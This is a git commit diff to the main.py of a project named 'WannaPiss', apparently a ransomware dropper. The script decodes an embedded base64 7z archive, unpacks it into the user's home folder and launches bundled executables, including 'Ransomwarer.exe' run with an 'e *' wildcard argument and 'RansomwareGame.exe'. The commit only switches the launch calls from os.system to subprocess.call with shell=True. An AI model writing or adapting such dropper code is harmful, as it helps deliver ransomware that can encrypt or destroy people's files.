dc85f3fcf651fb004dfa6e089fa0115aebc9b5d1
Luke Simmons <luke5083@live.com>
2022-04-02 13:58:17 -0500

    Use different command

--- WannaPiss/main.py
+++ WannaPiss/main.py
@@ -3,11 +3,12 @@ import os
 import py7zr
 import base64
 from io import BytesIO
+from subprocess import call
 compressed_data_bytes = base64.b64decode(compressed_data_string)
 bio = BytesIO(compressed_data_bytes)
 home = os.path.expanduser("~") + "/"
 wp_dir = home + "WannaPiss/"
 py7zr.unpack_7zarchive(bio, wp_dir)
-os.system('cd "' + wp_dir + '"; ' + "Metadata_Getter.exe")
-os.system('cd "' + wp_dir + '"; '"Ransomwarer.exe e '*'")
-os.system('cd "' + wp_dir + '"; '"RansomwareGame.exe")
+call("./Metadata_Getter.exe", cwd=wp_dir, shell=True)
+call("./Ransomwarer.exe e '*'", cwd=wp_dir, shell=True)
+call("./RansomwareGame.exe", cwd=wp_dir, shell=True)
